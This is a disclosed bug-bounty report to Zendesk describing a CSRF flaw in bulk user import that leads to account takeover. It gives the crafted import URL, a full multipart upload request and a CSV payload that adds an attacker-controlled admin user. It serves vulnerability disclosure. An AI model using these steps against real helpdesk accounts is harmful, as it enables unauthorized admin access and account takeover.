@@ -1,0 +1,73 @@
+ReportLink:https://hackerone.com/reports/102194
+WeaknessName:Cross-Site Request Forgery (CSRF)
+Reporter:https://hackerone.com/zombiehelp54
+ReportedTo:Zendesk(zendesk)
+BountyAmount:500.0
+Severity:
+State:Closed
+DateOfDisclosure:04.04.2016 21:48:40
+
+Summary:
+
+Hi , I have found a CSRF issue in `<your_zebdesk>.zendesk.com/jobs/createjob` that leads to full account take over.
+#Details: 
+When using bulk user import in `https://<your_zendesk>.zendesk.com/import?kind=user` after you upload a CSV file and press import , a request is sent to `https://<your_zendesk>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=IozGNzPJIR1AniyrlueEIkLL8&job[update_records]=true&return_to=/people&type=user_import`. 
+if you look at the request you'll see that the only token sent in the request is the `job[token]` value , so I have tried to change the url to `https://<victim_account>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=IozGNzPJIR1AniyrlueEIkLL8&job[update_records]=true&return_to=/people&type=user_import` , but the import failed and I received an email saying that there was an error when importing the users , but the error gave me a hint , This was the email: 
+```
+For some reason the data to import was not ready in our servers. Try again.
+
+We've been notified about this and will solve the problem if there's a bug. If the error persists, please contact our support team. The error was:
+
+undefined method `attachments' for nil:NilClass
+```
+as you can see the error gives a hint that the `job[token]` parameter value is an id of the uploaded CSV file which can only be generated when uploading the csv file in the bulk user import page. 
+But , wait a second , it says `attachments` which mean it's actually an id of an attachment , so if the attacker signed up as an end user account and tried to submit a ticket then uploaded his csv file as an attachment and got the file id and replaced it with the `job[token]` parameter value , so the link will look like : 
+`https://<victim_account>.zendesk.com/jobs/createjob?[password_email_change_csv_import]=true&job[token]=<uploaded_file_id>&job[update_records]=true&return_to=/people&type=user_import`, it will work and if the attacker sent that link to an admin user and the admin visited it , a user with admin privileges will be added!
+
+#Steps to reproduce:
+1. Login to your zendesk account as an end-user 
+2.  Send this POST request through the end user:
+
+```
+ POST https://<account>.zendesk.com/hc/en-us/request_uploads
+Host: sad69.zendesk.com
+User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-CSRF-Token: KVUlCzxLTdJRkLuZrsGoYMNWgaL56Y3Rg3SwX6DyuMi7UkWo7pEV2I7auJVAmD8k+KKo6d5o0wsouRjzWwsvWQ==
+X-Requested-With: XMLHttpRequest
+Referer: https://sad69.zendesk.com/hc/en-us/requests/new
+Content-Length: 557
+Content-Type: multipart/form-data; boundary=---------------------------3915858413600
+Cookie: <session_cookies>
+Connection: keep-alive
+Pragma: no-cache
+Cache-Control: no-cache
+
+
+-----------------------------3915858413600
+Content-Disposition: form-data; name="authenticity_token"
+
+<your_token>
+-----------------------------3915858413600
+Content-Disposition: form-data; name="file"; filename="csv.csv"
+Content-Type: application/vnd.ms-excel
+
+"name","email","external_id","details","notes","phone","role",
+"restriction","organization","tags"
+Hacker,"attacker@example.com",,,,,"admin","This is a hacker",,
+-----------------------------3915858413600--
+```
+
+3- Now get the response of the request then get the `ID` of the uploaded file , which will look like this `dwYMJH6N8QloZt7lFJeZ9bN26` (Please note that the id is not the attachment token)
+4- After that logout from the end user account then login with the account owner account and go to:
+
+```
+https://<account>.zendesk.com/jobs/create?job[password_email_change_csv_import]=true&job[token]=<uploaded_file_id>&job[update_records]=true&return_to=/people&type=user_import
+```
+5- Go to the agent email and you'll see an email saying that user import successfully completed , also you can verify by going to `https://<your_account>.zendesk.com/users` and you'll see that an admin named **Hacker** Was added. 
+
+I will attach the CSV file for importing the user , just in case you are having a trouble sending the request in step 2. 
+
+Thanks. 
